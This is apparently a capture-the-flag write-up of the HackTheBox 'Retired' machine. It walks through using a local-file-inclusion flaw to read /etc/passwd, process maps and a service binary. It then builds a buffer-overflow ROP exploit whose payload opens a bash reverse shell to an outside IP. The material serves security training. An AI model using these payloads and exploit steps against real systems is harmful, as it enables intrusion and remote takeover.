---
title: HackTheBox - Retired
date: 2022-08-16 11:00:00 +0800
categories: [HackTheBox]
tags: [api]
img_path: /assets/img/machine/retired/
---

![Retired Machine Info](retired-machine-card.png)

## Port Scan

> script scanning (`-sC`), version scanning (`-sV`), output all formats (`-oA`)
{: .prompt-info }

```bash
$ nmap -sC -sV -oA nmap/retired 10.129.227.96
Nmap scan report for 10.129.227.96
Host is up (0.052s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)
|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)
|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)
80/tcp open  http    nginx
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page=default.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno }

We can see that you have two ports open, running `ssh` and `http`. We can also see that the http port is running using `nginx`.

## Web enumeration

```bash
$ curl -i http://10.129.227.96/
HTTP/1.1 302 Found
Server: nginx
Date: Tue, 16 Aug 2022 09:40:22 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Location: /index.php?page=default.html
```
{: .nolineno }

When we make a request to the root of the web we can see that it makes a redirect with a url that seems somewhat suspicious.

```bash
$ curl http://10.129.227.96/index.php?page=../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
[...]
```
{: .nolineno }

Great! We have `LFI` so we can read files from the system, let's launch `feroxbuster` to see what other paths the web has.

> file extensions to be searched (`-x`)
{: .prompt-info }

```bash
$ feroxbuster -u http://10.129.227.96 -x php,html                                            

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.227.96
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c http://10.129.227.96/ => /index.php?page=default.html
302      GET        0l        0w        0c http://10.129.227.96/index.php => /index.php?page=default.html
200      GET       72l      304w     4144c http://10.129.227.96/beta.html
200      GET      188l      824w    11414c http://10.129.227.96/default.html
[...]
```
{: .nolineno }

Ignoring image folders, we can see another page besides `default.html`, let's see what `beta.html` contains.

![Beta Page](beta-page.png)

It looks like a file upload page, let's create a blank file and view the request and response with burpsuite.

![Upload File Request](upload-file-request.png)

We can see that it makes a POST request to `activate_license.php`, since we have our `LFI` let's see what this code is doing.

```php
$ curl http://10.129.227.96/index.php?page=activate_license.php     
<?php
  if(isset($_FILES['licensefile'])) {
      $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
      $license_size = $_FILES['licensefile']['size'];

      $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
      if (!$socket) { echo "error socket_create()\n"; }

      if (!socket_connect($socket, '127.0.0.1', 1337)) {
          echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
      }

      socket_write($socket, pack("N", $license_size));
      socket_write($socket, $license);

      socket_shutdown($socket);
      socket_close($socket);
  }
?>
```
{: .nolineno }

Apparently what it is doing is connecting to some service that is running on `localhost` on port `1337` and sending it first the size of the file and then the contents of the file.

> PHP pack function with `N` param sends unsigned long (always 32 bit, big endian byte order)
[PHP Manual](https://www.php.net/manual/en/function.pack.php)
{: .prompt-info }

Considering that there is some downstream process running on the localhost that `activate_license.php` is calling, let's try to identify it, for that, let's list the content of `/proc/sched_debug`.

> A summary of the task running on each processor is also shown, with the task name and PID, along with scheduler specific statistics. 
[Debugging Interface and Scheduler Statistics](https://doc.opensuse.org/documentation/leap/archive/15.0/tuning/html/book.sle.tuning/cha.tuning.taskscheduler.html)
{: .prompt-info }

```bash
$ curl -s http://10.129.227.96/index.php?page=../../../../../proc/sched_debug
Sched Debug Version: v0.11, 5.10.0-11-amd64 #1
[...]
runnable tasks:
 S            task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
-------------------------------------------------------------------------------------------------------------
[...]
 S activate_licens   411     20813.643987        10   120         0.000000         3.341139         0.000000 0 0 /
[...]
```
{: .nolineno }

One of the displayed tasks sounds familiar, considering that the page we were calling to upload the file is `activate_license.php`. The PID of the process is `411`, let's take a look.

```bash
$ curl -s http://10.129.227.96/index.php?page=../../../../../proc/411/cmdline -o cmdline

$ cat cmdline
/usr/bin/activate_license1337
```
{: .nolineno }

Perfect! we see that what is working on port `1337` is `/usr/bin/activate_license`, let's download it and take a look at it.

```bash
$ curl -s http://10.129.227.96/index.php?page=../../../../../usr/bin/activate_license -o activate_license

$ file activate_license                                                                                  
activate_license: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=554631debe5b40be0f96cabea315eedd2439fb81, for GNU/Linux 3.2.0, with debug_info, not stripped

$ chmod +x activate_license

$ ./activate_license 1337
[+] starting server listening on port 1337
[+] listening ...
```
{: .nolineno }

The file is a 64-bit binary that we can use to replicate the server's file upload operation. The most common vulnerability is usually a buffer overflow, so let's launch the program in `GDB` to see what it is doing. As we saw in the code of `activate_license.php`, it first sends the length of the file and then sends the content of the file.

```bash
$ gdb -q ./activate_license
gef➤  set follow-fork-mode child                                                              
gef➤  run 1337                           
Starting program: /home/kali/htb/retired/activate_license 1337
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fca000'
[Thread debugging using libthread_db enabled]                                                
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[+] starting server listening on port 1337                                                   
[+] listening ...
```
{: .nolineno }

```bash
$ printf "\x00\x00\x02\xbcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | nc 127.0.0.1 1337
```
{: .nolineno }

The payload consists of two parts, `\x00\x00\x02\xbc` which is 700 in hexadecimal and `"A" * 700`.
If we now look at the `gdb` tab we can see something like the following:

```bash
$rax   : 0x2d4             
$rbx   : 0x005555555557c0  →  <__libc_csu_init+0> push r15
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x007fffffffde58  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x0               
$rdi   : 0x007fffffffd6c0  →  0x007ffff7cced90  →  0x8b00000088bf8b48
$rip   : 0x005555555555c0  →  <activate_license+643> ret 
$r8    : 0x0               
$r9    : 0x007ffff7e080c0  →  0x0000000000000000
$r10   : 0x007ffff7e07fc0  →  0x0000000000000000
$r11   : 0x246             
$r12   : 0x00555555555220  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffde58│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"      ← $rsp
0x007fffffffde60│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde68│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde70│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde78│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde80│+0x0028: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde88│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde90│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555555b9 <activate_license+636> call   0x5555555550b0 <printf@plt>
   0x5555555555be <activate_license+641> nop    
   0x5555555555bf <activate_license+642> leave  
 → 0x5555555555c0 <activate_license+643> ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "activate_licens", stopped 0x5555555555c0 in activate_license (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555555c0 → activate_license(sockfd=0x4)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
{: .nolineno }

We note that the program has crashed, and we have overwritten the stack with all `A`, which indicates that it is indeed vulnerable to buffer overflow.

The reason the `RIP` was not overflowed (technically it was, as we saw in the above screenshot, but there's more to it), is because the AAAAAAAA (0x4141414141414141) is considered a non-canonical memory address, or, in other words, 0x4141414141414141 is a 64-bit wide address and current CPUs prevent applications and OSes to use 64-bit wide addresses. 
Instead, the highest memory addresses programs can use are 48-bit wide addresses and they are capped to 0x00007FFFFFFFFFFF. This is done to prevent the unnecessary complexity in memory address translations that would not provide much benefit to the OSes or applications as it's very unlikely they would ever need to use all of that 64-bil address space. 

To know exactly at what point we are going to overwrite `RIP` we are going to create a pattern of `700` as before, so we resend it replacing the A's with our pattern.

```bash
gef➤  pattern create 700
[+] Generating a pattern of 700 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaa
```
{: .nolineno }

```bash
$rax   : 0x2d4             
$rbx   : 0x005555555557c0  →  <__libc_csu_init+0> push r15
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x007fffffffde58  →  "paaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacva[...]"
$rbp   : 0x636161616161616f ("oaaaaaac"?)
$rsi   : 0x0               
$rdi   : 0x007fffffffd6c0  →  0x007ffff7cced90  →  0x8b00000088bf8b48
$rip   : 0x005555555555c0  →  <activate_license+643> ret 
$r8    : 0x0               
$r9    : 0x007ffff7e080c0  →  0x0000000000000000
$r10   : 0x007ffff7e07fc0  →  0x0000000000000000
$r11   : 0x246             
$r12   : 0x00555555555220  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────0x007fffffffde58│+0x0000: "paaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacva[...]"      ← $rsp
0x007fffffffde60│+0x0008: "qaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwa[...]"
0x007fffffffde68│+0x0010: "raaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxa[...]"
0x007fffffffde70│+0x0018: "saaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacya[...]"
0x007fffffffde78│+0x0020: "taaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaacza[...]"
0x007fffffffde80│+0x0028: "uaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadba[...]"
0x007fffffffde88│+0x0030: "vaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadca[...]"
0x007fffffffde90│+0x0038: "waaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaadda[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555555b9 <activate_license+636> call   0x5555555550b0 <printf@plt>
   0x5555555555be <activate_license+641> nop    
   0x5555555555bf <activate_license+642> leave  
 → 0x5555555555c0 <activate_license+643> ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "activate_licens", stopped 0x5555555555c0 in activate_license (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────[#0] 0x5555555555c0 → activate_license(sockfd=0x4)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────x/xg $rsp
0x7fffffffde58: 0x6361616161616170
gef➤  pattern offset 0x6361616161616170
[+] Searching for '0x6361616161616170'
[+] Found at offset 520 (little-endian search) likely
```
{: .nolineno }

Ok, `520` is the amount of junk we need to overwrite the stack, so the next 8 bytes are the ones that are going to overwrite `RIP`, knowing this we can start crafting our exploit.

We are going to make use of the `pwn` python library, so if you don't have it you must install it with:

```bash
$ pip install pwn
```
{: .nolineno }

Before we continue we need a few things to be able to craft our exploit:
1. binary base address
2. libc base address
3. libc itself

In order to obtain the addresses we need, we will execute the following through the `LFI` we had active:

```bash
$ curl -s http://10.129.227.96/index.php?page=../../../../../proc/411/maps -o maps

$ cat maps                                                                        
55fc9a3b1000-55fc9a3b2000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
55fc9a3b2000-55fc9a3b3000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
55fc9a3b3000-55fc9a3b4000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
55fc9a3b4000-55fc9a3b5000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
55fc9a3b5000-55fc9a3b6000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
55fc9be50000-55fc9be71000 rw-p 00000000 00:00 0                          [heap]
[...]
7f32526b9000-7f32526c8000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f32526c8000-7f3252762000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f3252762000-7f32527fb000 r--p 000a9000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f32527fb000-7f32527fc000 r--p 00141000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f32527fc000-7f32527fd000 rw-p 00142000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f32527fd000-7f3252822000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f3252822000-7f325296d000 r-xp 00025000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f325296d000-7f32529b7000 r--p 00170000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f32529b7000-7f32529b8000 ---p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f32529b8000-7f32529bb000 r--p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f32529bb000-7f32529be000 rw-p 001bd000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
[...]
7fff22762000-7fff22783000 rw-p 00000000 00:00 0                          [stack]
7fff227ca000-7fff227ce000 r--p 00000000 00:00 0                          [vvar]
7fff227ce000-7fff227d0000 r-xp 00000000 00:00 0                          [vdso]
```
{: .nolineno }

`0x55fc9a3b1000` is the binary base address and `0x7f32527fd000` is the libc base address.

```bash
$ curl -s http://10.129.227.96/index.php?page=../../../../../usr/lib/x86_64-linux-gnu/libc-2.31.so -o libc-2.31.so
```
{: .nolineno }

One more thing before we start, since we have downloaded libc let's see the address of the system function to execute our payload later.
```bash
$ objdump -d libc-2.31.so | grep system
0000000000048e50 <__libc_system@@GLIBC_PRIVATE>:
   48e53:       74 0b                   je     48e60 <__libc_system@@GLIBC_PRIVATE+0x10>
000000000012d5e0 <svcerr_systemerr@@GLIBC_2.2.5>:
  12d637:       75 05                   jne    12d63e <svcerr_systemerr@@GLIBC_2.2.5+0x5e>
```
{: .nolineno }

Ok! so now we have everything we need to start crafting our exploit.

```python
from pwn import *

offset = 520

# libc
libc_base = 0x7f32527fd000
libc_system = 0x48e50

# binary
binary_base = 0x55fc9a3b1000
```
{: .nolineno }

Okay, before we start, let's define the attack strategy, which will be as follows:

1. fill stack with junk to gain control of the `rip` (instruction pointer)
2. find a section in memory where we can write
3. write our payload in to the writable memory
4. call the function system indicating as parameter a pointer to the memory section in which we have written our payload

Step 1 is already complete, we know that we need `520 bytes` of junk and the next `8 bytes` are the ones that will overwrite `rip`.

To find a section that we can write to, let's look for the `.data` part inside the binary.

```bash
$ readelf -S activate_license | grep ".data"
  [16] .rodata           PROGBITS         0000000000002000  00002000
  [23] .data             PROGBITS         0000000000004000  00003000
```
{: .nolineno }

Great, now we know that the address we have to write to is `binary_base + 0x4000`.

To copy our payload to the memory section where we can write and then execute the system call, we are going to make use of some [ROP Gadgets](https://en.wikipedia.org/wiki/Return-oriented_programming) that will help us in this task.

```bash
$ ropper -f libc-2.31.so --search "pop rdi; ret"
0x0000000000026796: pop rdi; ret;
0x0000000000084bfd: pop rdi; retf; adc eax, dword ptr [rax]; ror rax, 0x11; xor rax, qword ptr fs:[0x30]; jmp rax;

$ ropper -f libc-2.31.so --search "pop rdx; ret"
0x00000000000cb1cd: pop rdx; ret;

$ ropper -f libc-2.31.so --search "mov [rdi], rdx; ret"
0x000000000003ace5: mov qword ptr [rdi], rdx; ret;
```
{: .nolineno }

Now that we have everything we need we are going to generate the final exploit with all of the above.

```bash
from pwn import *

offset = 520

# libc
libc_base = 0x7f32527fd000
libc_system = p64(libc_base + 0x48e50)

# binary
binary_base = 0x55fc9a3b1000
writable = binary_base + 0x4000

# gadgets
POP_RDI = p64(libc_base + 0x26796)
POP_RDX = p64(libc_base + 0xcb1cd)
MOV_RDI_RDX = p64(libc_base + 0x3ace5)

sh = b"bash -c 'bash -i >& /dev/tcp/10.10.14.42/4242 0>&1'"

rop = b"A" * offset
for i in range(0, len(sh), 8):
  rop += POP_RDI
  rop += p64(writable + i)
  rop += POP_RDX
  rop += sh[i:i+8].ljust(8, b"\x00")
  rop += MOV_RDI_RDX

rop += POP_RDI
rop += p64(writable)
rop += libc_system

with open('license.payload', 'wb') as f:
  f.write(rop)
```

It sounds complicated, but really what you are doing is very simple. We adjust all the gadgets that we have found taking into account what is the base of libc, as well as the section in memory in which we are going to write with respect to the base of the binary.

We create our payload (`line 18`), we start the rop introducing the junk (`520 bytes`) and we make a loop over our payload in fragments of `8 bytes`, for each iteration an address in memory is established in which it will be written, starting from the initial base (`line 23`), this address is stored in `rdi`, the following is to take the 8 bytes corresponding to the payload (and in case of needing it because it does not have 8 bytes long, add nullbytes to fill it), store these bytes in `rdx` (`line 25`). Subsequently, the content of `rdx` is moved to the memory address indicated by `rdi`. At the end of the for loop, what we have achieved is to write the whole string of our payload in memory.

For the final phase, all we do is push the address with the start of our payload into `rdi` and call system, which uses `rdi` as the first function parameter.

We save the final result in a file, and use the functionality of the application that we had seen before to upload our file.
